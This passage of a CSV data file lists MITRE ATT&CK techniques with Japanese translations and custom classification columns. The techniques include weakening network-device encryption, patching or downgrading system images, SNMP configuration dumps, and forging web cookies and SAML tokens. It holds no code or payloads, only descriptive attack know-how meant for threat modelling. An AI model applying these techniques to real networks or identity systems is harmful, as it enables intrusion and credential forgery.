RFC1918）。攻撃者がネットワーク境界デバイスの制御権を獲得した場合、既存のNAT設定を利用して分離された2つのネットワーク間でトラフィックを送信するか、独自の設計によるNAT設定を実装することが可能となる。 NAT機能を必要とするネットワーク設計の場合、これにより攻撃者は境界デバイスの背後にある保護システムへのアクセスを通常阻む固有のルーティング制限を回避できます。NATを必要としない設計の場合でも、境界デバイスを通過するパケットのアドレス変更は防御側のデータ監視を困難にするため、攻撃者はアドレス変換を利用して活動を隠蔽できます。 攻撃者は[Patch System Image](https://attack.mitre.org/techniques/T1601/001)を用いてネットワークデバイスのOSを変更し、独自のカスタムNATメカニズムを実装することで活動をさらに隠蔽する可能性がある,defense-evasion,Network Devices,config_policy_manipulation,stealth,endpoint_execution;network_connectivity;logging_monitoring,specified,Network Device (FW/Proxy/AP),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--4ffc1794-ec3b-45be-9e52-42dbcb2af2de,2020-10-19T16:48:08.241Z,2025-04-25T14:46:38.101Z,,,,
T1600,,Weaken Encryption,暗号化の弱体化,"Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution) Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key. Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",攻撃者は、データ通信を保護する暗号化を迂回するため、ネットワークデバイスの暗号化機能を侵害する可能性があります。（引用元：Cisco Synful Knock Evolution）暗号化は、送信されるネットワークトラフィックの機密性（不正開示からの保護）と完全性（不正変更からの保護）を維持するために使用されます。 暗号化アルゴリズムは平文メッセージを暗号文に変換するために使用され、関連する復号鍵なしでは解読に計算負荷がかかる。通常、鍵が長いほど、鍵なしでの解読（暗号解読）のコストが増加する。 攻撃者は、ネットワークトラフィックの暗号化を行うデバイスを侵害・操作することが可能です。例えば、[システムイメージの改変](https://attack.mitre.org/techniques/T1601)、 [鍵空間の縮小](https://attack.mitre.org/techniques/T1600/001)、[暗号ハードウェアの無効化](https://attack.mitre.org/techniques/T1600/002)といった行為により、敵対者はデバイスのネットワークトラフィックを安全に暗号化する能力を損ない、あるいは無効化することが可能です。 これにより不正開示のリスクが高まり、データ改ざん、認証情報へのアクセス、または収集活動を助長する可能性があります。（引用元：Cisco Blog Legacy Device Attacks）,defense-evasion,Network Devices,credential_abuse,stealth,authentication_system;network_connectivity;logging_monitoring,specified,Log / Monitoring Server;Network Device (FW/Proxy/AP),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8,2020-10-19T18:47:08.759Z,2025-04-25T15:15:15.040Z,,,,
T1600.001,T1600,Reduce Key Space,鍵空間の縮小,"Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution) Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key. Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device. (Citation: Cisco Blog Legacy Device Attacks)",敵対者は、暗号化された通信の暗号強度を低下させることで、ネットワーク経由で送信されるデータの復号に必要な労力を軽減できる。(引用元: Cisco Synful Knock Evolution)敵対者は、平文を暗号文に変換するためにソフトウェアが使用するキーサイズを縮小することで（例えば、数百バイトまたは数千バイトからわずか数バイトに）、侵害されたネットワークデバイスの暗号化ソフトウェアを弱体化させることができる。 その結果、攻撃者は鍵なしで保護された情報を復号するために必要な労力を劇的に削減できる。 攻撃者は、デバイスの設定を変更するために [システムイメージの変更](https://attack.mitre.org/techniques/T1601) を通じてシステムに導入された [ネットワークデバイス CLI](https://attack.mitre.org/techniques/T1059/008) の専用コマンドを使用して、使用されるキーサイズやその他の暗号化パラメータを変更する可能性があります。 (引用元: Cisco Blog Legacy Device Attacks),defense-evasion,Network Devices,script_command_execution,stealth,endpoint_execution;network_connectivity;logging_monitoring,specified,Log / Monitoring Server;Network Device (FW/Proxy/AP),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--3a40f208-a9c1-4efa-a598-4003c3681fb8,2020-10-19T19:03:48.310Z,2025-04-25T14:46:24.048Z,,,,
T1600.002,T1600,Disable Crypto Hardware,暗号化ハードウェアの無効化,"Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data. Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)",攻撃者はネットワークデバイスの専用ハードウェア暗号化機能を無効化します。これによりソフトウェア暗号化の脆弱性を悪用し、送信データの収集・操作・漏洩にかかる労力を軽減できる可能性があります。ルーター、スイッチ、ファイアウォールなどの多くのネットワークデバイスは、ネットワーク間での安全な通信を確保するため、ネットワークトラフィックの暗号化を実行します。多くの場合、これらのデバイスには暗号化処理の速度を大幅に向上させるとともに悪意のある改ざんを防ぐための専用暗号化ハードウェアが搭載されています。 攻撃者がこうしたデバイスを制御下に置くと、例えば[Modify System Image](https://attack.mitre.org/techniques/T1601)の使用を通じて専用ハードウェアを無効化し、汎用プロセッサ上でソフトウェアによる暗号化を強制的に実行させることが可能となる。 これは通常、ソフトウェア上の暗号強度を弱体化させる攻撃（例：[鍵空間の縮小](https://attack.mitre.org/techniques/T1600/001)）と組み合わせて使用される。（引用元：Cisco Blog Legacy Device Attacks）,defense-evasion,Network Devices,data_collection,stealth,authentication_system;endpoint_execution;network_connectivity;logging_monitoring,specified,Log / Monitoring Server;Network Device (FW/Proxy/AP),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--7efba77e-3bc4-4ca5-8292-d8201dcd64b5,2020-10-19T19:11:18.757Z,2025-04-25T14:47:14.891Z,,,,
T1601,,Modify System Image,システムイメージの改変,"Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves. On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file. To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it. This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",攻撃者は、防御を弱体化させ、自らに新たな機能を提供するために、組み込みネットワークデバイスのオペレーティングシステムに変更を加える場合があります。 こうしたデバイスでは、OSは通常モノリシックであり、デバイスの機能や能力の大半が単一ファイルに収められている。OSを変更するには、攻撃者は通常この1つのファイルのみに影響を与え、それを置換または改変すればよい。これは、システム実行時にメモリ上でライブに実行して即時効果を得る方法と、ストレージ上で実行してネットワークデバイスの次回起動時に変更を実装する方法がある。,defense-evasion,Network Devices,other,stealth,network_connectivity;file_storage_access,specified,Network Device (FW/Proxy/AP),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--ae7f3575-0a5e-427e-991b-fe03ad44c754,2020-10-19T19:42:19.740Z,2025-04-25T15:15:59.227Z,,,,
T1601.001,T1601,Patch System Image,システムイメージのパッチ適用,"Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen of the Dead) Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file. Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime. To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection. The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image. To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system. This method typically requires administrative level access to the device. In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system. Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory. This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime. By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599). Adding new capabilities for the adversary’s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001). Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders. When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system. By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005). When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots. However, live memory modification of the operating system can be combined with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve persistence.",攻撃者はネットワークデバイスのオペレーティングシステムを改変し、新たな機能を導入したり既存の防御を弱体化させることがある。（引用：Cisco IOSルートキットの神話の終焉）（引用：IOS多様性神話の終焉）（引用：Cisco IOSシェルコード）（引用：Cisco IOSフォレンジック技術の発展）（引用：Juniper Netscreen of the Dead） 一部のネットワーク機器はモノリシックアーキテクチャで構築されており、OS全体と機器の機能の大部分が単一ファイルに格納されている。攻撃者は、将来の起動時にロードされるようストレージ上のこのファイルを変更したり、実行時にメモリ内で変更したりする可能性がある。 ストレージ内のオペレーティングシステムを変更する場合、攻撃者は通常、デバイス運用者が利用可能な標準手順を使用します。これには、TFTP、FTP、SCPなどのネットワークデバイスで一般的に使用されるプロトコル、またはコンソール接続を介した新しいファイルのダウンロードが含まれる可能性があります。元のファイルを上書きするか、新しいファイルを並列に書き込んでデバイスを再構成し、改ざんされたイメージから起動させることがあります。 メモリ内のOSを変更する場合、攻撃者は通常2つの方法のいずれかを使用します。第一の方法では、攻撃者は変更されていない元の稼働OSに組み込まれたネイティブデバッグコマンドを利用し、稼働中のOSを含む関連メモリアドレスを直接改変します。この方法には通常、デバイスへの管理者レベルアクセス権限が必要です。 メモリ内のOSを変更する第二の方法では、攻撃者はブートローダーを利用します。ブートローダーはデバイス起動時に最初に読み込まれるソフトウェアであり、これがOSを起動します。 攻撃者は、[ROMMONkit](https://attack.mitre.org/techniques/T1542/004)手法などによりブートローダーに事前に埋め込まれた悪意のあるコードを使用し、メモリ内の実行中OSコードを直接操作することが可能です。ブートローダー内のこの悪意のあるコードは、攻撃者に直接メモリ操作の能力を提供し、実行中のOSをランタイム中にパッチ適用することを可能にします。 システムイメージファイルに格納された命令を改変することで、攻撃者は既存の防御機能を弱体化させるか、デバイスが元々持たなかった新たな機能を付与することが可能です。妨害可能な既存防御機能の例としては、暗号化（[暗号化弱体化](https://attack.mitre.org/techniques/T1600)経由）、 ネットワークデバイス認証による認証機能の弱体化（[Network Device Authentication](https://attack.mitre.org/techniques/T1556/004)）、境界防御機能の無効化（[Network Boundary Bridging](https://attack.mitre.org/techniques/T1599)）などがあります。 攻撃者の目的に沿った新たな機能の追加には、[キーロギング](https://attack.mitre.org/techniques/T1056/001)、 [マルチホッププロキシ](https://attack.mitre.org/techniques/T1090/003)、[ポートノッキング](https://attack.mitre.org/techniques/T1205/001)などが挙げられる。 攻撃者はまた、防御者を欺くために偽の出力を作成するため、オペレーティングシステム内の既存コマンドを改ざんする可能性があります。この手法が[システムイメージのダウングレード](https://attack.mitre.org/techniques/T1601/002)と組み合わされた場合、改ざんされたシステムコマンドの一例として、現在実行中のオペレーティングシステムのバージョンを表示するコマンドの出力を変更することが挙げられます。 オペレーティングシステムにパッチを適用することで、攻撃者はこのコマンドを変更し、システムダウングレードによって置き換えた元の、より高いリビジョン番号を表示させることができます。 オペレーティングシステムがストレージ上でパッチ適用される場合、これは常駐ストレージ（通常はフラッシュメモリなどの不揮発性メモリ）内、または[TFTPブート](https://attack.mitre.org/techniques/T1542/005)経由で実現される。 この手法が保存コピーではなくメモリ内の稼働中のオペレーティングシステムに対して実行された場合、再起動を跨いで持続しません。ただし、オペレーティングシステムのライブメモリ改変を[ROMMONkit](https://attack.mitre.org/techniques/T1542/004)と組み合わせることで永続性を実現できます。,defense-evasion,Network Devices,script_command_execution,stealth,authentication_system;privileged_account;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Log / Monitoring Server;Network Device (FW/Proxy/AP);Proxy / Gateway,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--d245808a-7086-4310-984a-a84aaaa43f8f,2020-10-19T19:49:24.129Z,2025-04-25T14:48:09.178Z,,,,
T1601.002,T1601,Downgrade System Image,システムイメージのダウングレード,"Adversaries may install an older version of the operating system of a network device to weaken security. Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution) On embedded devices, downgrading the version typically only requires replacing the operating system file in storage. With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart. The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts. Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600). Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001).",攻撃者はネットワークデバイスのOSを古いバージョンにダウングレードし、セキュリティを弱体化させる可能性がある。 ネットワークデバイス上の古いOSバージョンは、暗号化アルゴリズムが脆弱な場合が多く、一般的に防御機能が不足しているか更新されていない。（出典: Cisco Synful Knock Evolution）組込みデバイスでは、バージョンダウングレードは通常、ストレージ内のOSファイルを置き換えるだけで実現可能である。ほとんどの組込みデバイスでは、目的のバージョンのOSファイルをダウンロードし、次回のシステム再起動時にそのファイルから起動するようデバイスを再構成することで達成できる。 攻撃者はデバイスを再起動して変更を即時適用することも、システムの次回再起動まで待機することも可能です。システムイメージを古いバージョンにダウングレードすることで、攻撃者は[暗号化を弱体化させる](https://attack.mitre.org/techniques/T1600)といった動作を可能にし、防御を回避できる可能性があります。 システムイメージのダウングレードは単独で実行可能であり、[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)と組み合わせて使用することもできる。,defense-evasion,Network Devices,destructive_impact,stealth,network_connectivity;file_storage_access,specified,Network Device (FW/Proxy/AP),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--fc74ba38-dc98-461f-8611-b3dbf9978e3d,2020-10-19T19:53:10.576Z,2025-04-25T14:48:39.086Z,,,,
T1602,,Data from Configuration Repository,構成リポジトリからのデータ,"Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices. Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",攻撃者は、構成リポジトリから管理対象デバイスに関連するデータを収集する可能性があります。構成リポジトリは、管理システムがリモートシステム上のデータを構成、管理、制御するために使用されます。構成リポジトリは、デバイスのリモートアクセスや管理を容易にする場合もあります。攻撃者は、大量の機密性の高いシステム管理データを収集するために、これらのリポジトリを標的とする可能性があります。 構成リポジトリのデータは様々なプロトコルやソフトウェアによって公開される可能性があり、多様なデータを保存できる。その多くは攻撃者の情報収集目的に合致する可能性がある。(引用: US-CERT-TA18-106A)(引用: US-CERT TA17-156A SNMP悪用 2017),collection,Network Devices,config_policy_manipulation,asset_access,network_connectivity,specified,Network Device (FW/Proxy/AP),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74,2020-10-19T23:46:13.931Z,2025-04-16T20:37:15.147Z,,,,
T1602.001,T1602,SNMP (MIB Dump),SNMP（MIBダンプ）,"Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP). The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details. Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)",攻撃者は、シンプルネットワーク管理プロトコル（SNMP）で管理されるネットワークにおいて、貴重な情報を収集および/または抽出するために管理情報ベース（MIB）を標的とする可能性があります。MIBは、SNMP経由でアクセス可能な可変情報をオブジェクト識別子（OID）の形式で保存する構成リポジトリです。 各OIDは読み取りまたは設定可能な変数を識別し、これらの変数のリモート変更を通じて設定変更などの能動的な管理タスクを許可します。SNMPは、システム情報、ハードウェアの説明、物理的な場所、ソフトウェアパッケージなど、システムに関する深い洞察を管理者に提供します（引用元：SANS Information Security Reading Room Securing SNMP Securing SNMP）。MIBには、実行中の設定、ルーティングテーブル、インターフェースの詳細など、デバイスの運用情報も含まれる場合があります。 攻撃者はSNMPクエリを利用し、SNMP管理対象デバイスから直接MIBコンテンツを収集することで、ネットワーク情報を取得し、ネットワークマップ構築や将来的な標的型攻撃を容易にすることが可能です（引用元：US-CERT-TA18-106A）（引用元：Cisco Blog Legacy Device Attacks）。,collection,Network Devices,script_command_execution,asset_access,privileged_account;endpoint_execution;network_connectivity;logging_monitoring,specified,Log / Monitoring Server;Network Device (FW/Proxy/AP),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5,2020-10-19T23:51:05.953Z,2025-04-25T14:48:29.549Z,,,,
T1602.002,T1602,Network Device Configuration Dump,ネットワークデバイス設定ダンプ,"Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use. Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.",攻撃者はネットワーク設定ファイルにアクセスし、デバイスおよびネットワークに関する機密データを収集する可能性があります。ネットワーク設定ファイルはデバイスの動作を決定するパラメータを含むファイルです。デバイスは通常、動作中に設定のメモリ内コピーを保持し、デバイスリセット後に読み込むための不揮発性ストレージ上の別個の構成を保持します。 攻撃者は設定ファイルを調査することで、標的ネットワークとその構成、ネットワークデバイスとそのソフトウェアに関する情報を明らかにしたり、正当なアカウントや認証情報を特定して後で使用したりすることが可能です。 攻撃者は、Simple Network Management Protocol（SNMP）やSmart Install（SMI）などの一般的な管理ツールやプロトコルを使用して、ネットワーク構成ファイルにアクセスできます。（引用元：US-CERT TA18-106A Network Infrastructure Devices 2018）（引用元：Cisco Blog Legacy Device Attacks）これらのツールは、構成リポジトリから特定のデータを照会したり、後日の分析のために構成をエクスポートするようデバイスを設定したりするために使用される可能性があります。,collection,Network Devices,credential_abuse,asset_access,authentication_system;network_connectivity;file_storage_access;logging_monitoring,specified,Log / Monitoring Server;Network Device (FW/Proxy/AP),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd,2020-10-20T00:08:21.745Z,2025-04-25T14:46:40.804Z,,,,
T1606,,Forge Web Credentials,Web認証情報の偽造,"Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access. Adversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials (i.e., [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)), or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.(Citation: AWS Temporary Security Credentials)(Citation: Zimbra Preauth) Once forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)",攻撃者は、Webアプリケーションやインターネットサービスへのアクセスを得るために使用できる認証情報を偽造する可能性があります。Webアプリケーションやサービス（クラウドSaaS環境またはオンプレミスサーバーでホストされる）は、ユーザーアクセスの認証と認可のためにセッションクッキー、トークン、その他の認証情報を使用することがよくあります。攻撃者は、Webリソースへのアクセスを得るためにこれらの認証情報を生成する可能性があります。 これは、[Webセッションクッキーの窃取](https://attack.mitre.org/techniques/T1539)、[アプリケーションアクセストークンの窃取](https://attack.mitre.org/techniques/T1528)、その他の類似した行動とは異なり、認証情報が正当なユーザーから盗まれたり傍受されたりしたものではなく、攻撃者によって新たに偽造されたものである点が特徴です。 Web 認証情報の生成には、パスワード、[秘密鍵](https://attack.mitre.org/techniques/T1552/004)、その他の暗号シード値などの秘密値が必要になる場合が多くあります。(引用元: GitHub AWS-ADFS-Credential-Generator) 攻撃者は、AWS の `AssumeRole` や `GetFederationToken` API などの機能を利用し、一時的なセキュリティ認証情報（例: [一時的な昇格クラウドアクセス](https://attack.mitre.org/techniques/T1548/005))を要求できる機能や、Zimbraの`zmprov gdpak`コマンド（ドメイン内の任意のユーザー向けトークン生成に利用可能な事前認証キーを生成）を悪用する可能性があります。(引用元: AWS Temporary Security Credentials)(引用元: Zimbra Preauth) これらのWeb認証情報を偽造すると、攻撃者はリソースへのアクセス（例: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)）が可能となり、多要素認証やその他の認証保護メカニズムを迂回する恐れがあります。(引用: Pass The Cookie)(引用: Unit 42 Mac Crypto Cookies January 2019)(引用: Microsoft SolarWinds Customer Guidance),credential-access,SaaS;Windows;macOS;Linux;IaaS;Office Suite;Identity Provider,credential_abuse,credential_gain,authentication_system;mfa_in_use;identity_federation;privileged_account;user_interaction;endpoint_execution;cloud_control_plane;saas_in_use,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--94cb00a4-b295-4d06-aa2b-5653b9c1be9c,2020-12-17T02:13:46.247Z,2025-04-15T22:37:02.111Z,,,,
T1606.001,T1606,Web Cookies,Webクッキー,"Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access. Adversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values. Once forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)",攻撃者は、Webアプリケーションやインターネットサービスへのアクセスを得るために使用できる偽造Webクッキーを作成する可能性があります。Webアプリケーションやサービス（クラウドSaaS環境またはオンプレミスサーバーでホストされているもの）は、ユーザーアクセスの認証と認可にセッションクッキーを使用することがよくあります。 攻撃者は、ウェブリソースへのアクセス権を取得するために、これらのクッキーを生成することがあります。これは、正当なユーザーから盗まれたり傍受されたりするのではなく、攻撃者によって新たに偽造されたクッキーである点で、[Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) やその他の類似した動作とは異なります。 一般的なWebアプリケーションの多くは、提供されたツールやインターフェースを使用して生成可能な標準化・文書化されたクッキー値を持っています（引用元: Pass The Cookie）。Webクッキーの生成には、パスワード、[秘密鍵](https://attack.mitre.org/techniques/T1552/004)、その他の暗号化シード値などの秘密値が必要となる場合が多いです。 偽造されたこれらのWebクッキーを悪用することで、攻撃者はリソース（[Webセッションクッキー](https://attack.mitre.org/techniques/T1550/004)）にアクセス可能となり、多要素認証やその他の認証保護メカニズムを迂回する可能性があります。（引用元：Volexity SolarWinds）（引用元：Pass The Cookie）（引用元：Unit 42 Mac Crypto Cookies January 2019）,credential-access,Linux;macOS;Windows;SaaS;IaaS,credential_abuse,credential_gain,authentication_system;mfa_in_use;user_interaction;cloud_control_plane;saas_in_use,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--861b8fd2-57f3-4ee1-ab5d-c19c3b8c7a4a,2020-12-17T02:14:34.178Z,2025-04-15T23:20:22.744Z,,,,
T1606.002,T1606,SAML Tokens,SAMLトークン,"An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML) An adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users. An adversary may gain administrative Entra ID privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)",攻撃者は、有効な SAML トークン署名証明書を所有している場合、任意の権限クレームと有効期間を持つ SAML トークンを偽造できる。(引用元: Microsoft SolarWinds Steps) SAML トークンのデフォルトの有効期間は 1 時間であるが、トークンの <code>conditions ...</code> 要素内の <code>NotOnOrAfter</code> 値で有効期間を指定できる。 この値は、<code>LifetimeTokenPolicy</code> 内の <code>AccessTokenLifetime</code> を使用して変更できます。(引用元: Microsoft SAML Token Lifetimes) 偽造された SAML トークンにより、攻撃者は SSO (シングルサインオン) メカニズムとして SAML 2.0 を使用するサービス間で認証を行うことが可能になります。(引用元: Cyberark Golden SAML) 